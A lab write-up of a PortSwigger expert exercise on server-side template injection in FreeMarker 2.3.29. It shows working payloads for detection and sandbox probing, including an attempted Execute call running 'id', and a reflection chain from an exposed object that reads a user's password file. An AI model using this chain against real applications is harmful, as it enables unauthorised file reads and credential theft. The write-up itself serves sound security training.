## Server-Side Template Injection in a Sandboxed Environment



**Platform:** PortSwigger Web Security Academy

**Difficulty:** Expert

**Template Engine:** FreeMarker `2.3.29`




### 1. SSTI Detection




The vulnerable parameter was:



```text

template=${7*7}

```



The server evaluated it and returned:



```text

49

```



This confirmed **Server-Side Template Injection (SSTI)**.



---




### 2. Identify the Template Engine



Payload:



```text


${.version}

```



Result:



```text

2.3.29

```




So the application uses **FreeMarker 2.3.29**.



---



### 3. Test `?api`



Payload:



```text

${"test"?api}

```



The server returned:



```text


api_builtin_enabled configuration setting is false

```



Therefore:



```text

?api → Disabled

```



The normal FreeMarker API access was not available.



---



### 4. Test `?new`



I tried to instantiate FreeMarker's `Execute` utility:



```text

${"freemarker.template.utility.Execute"?new()("id")}

```



The server responded:



```text

Instantiating freemarker.template.utility.Execute

is not allowed

```




This showed that the **TemplateClassResolver** was blocking dangerous class instantiation.



So:



```text

?new → Available

Dangerous classes → Blocked

```



---



### 5. Find an Existing Java Object



Instead of creating a new dangerous object, I looked for objects already exposed by the application.



Payload:



```text

${product.getClass()}

```



Result:



```text

class lab.actions.templateengines.FreeMarkerProduct

```



Therefore, `product` is a Java object.



---



### 6. Explore the Java Object



I tested:



```text

${product.getClass().getMethods()}


```



The error showed that the expression successfully returned a `SimpleSequence`.



This confirmed that Java reflection methods were accessible through the existing object.



The important idea was:



```text

product

   ↓


getClass()

   ↓

Java Class object

```



From the Java API, `Class` provides:



```text

getProtectionDomain()

```



Then `ProtectionDomain` provides:



```text

getCodeSource()

```



And `CodeSource` provides:




```text
getLocation()

```



This creates the following object chain:


```text

product

 ↓

getClass()

 ↓

getProtectionDomain()

 ↓

getCodeSource()

 ↓

getLocation()

```



---



### 7. Reach the Target File


After obtaining the code location, the Java URL/URI APIs can be chained to access the target file:




```text

toURI()

→ resolve('/home/carlos/my_password.txt')

→ toURL()

→ openStream()

→ readAllBytes()

```




Final payload:



```text

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.

txt').toURL().openStream().readAllBytes()?join(" ")}

```



---




### 8. Why the Password Appeared as Numbers



`readAllBytes()` returns the file contents as bytes.



The output looked like:



```text

118 118 113 109 114 97 110 115 108 56 ...

```



These are decimal **ASCII values**.





For example:



```text

118 → v

97  → a

109 → m

56  → 8

```

Converting all values produced:




```text

vvqmransl8sf6oy3mnil

```



---



## Key Takeaways



```text

SSTI

 ↓

Identify Template Engine

 ↓
Identify Version

 ↓
Test Available Built-ins

 ↓

Identify Sandbox Restrictions

 ↓

Find Application-Supplied Objects

 ↓

Identify Java Objects

 ↓


Explore Accessible Methods

 ↓

Build an Object Chain

 ↓

Reach the Intended Impact

```



### Important Lesson



Don't memorize the final payload.



The important skill is learning how to move from:



```text

Java object

    ↓

Class

    ↓


Accessible method
    ↓

New object

    ↓

Another useful method

    ↓

Target

```



In this lab, the key bypass was using an **existing application-supplied Java object** instead of relying on `?api` 
or instantiating the blocked `Execute` class.


### References


* [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)

* [Apache FreeMarker — Java Objects / Bean Wrapper](https://freemarker.apache.org/docs/pgui_misc_beanwrapper.html?utm_source=chatgpt.com)

* [Apache FreeMarker — `new` Built-in](https://freemarker.apache.org/docs/ref_builtins_expert.html?utm_source=chatgpt.com#ref_builtin_new)

* [Oracle Java — Class API](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Class.html?utm_source=chatgpt.com)
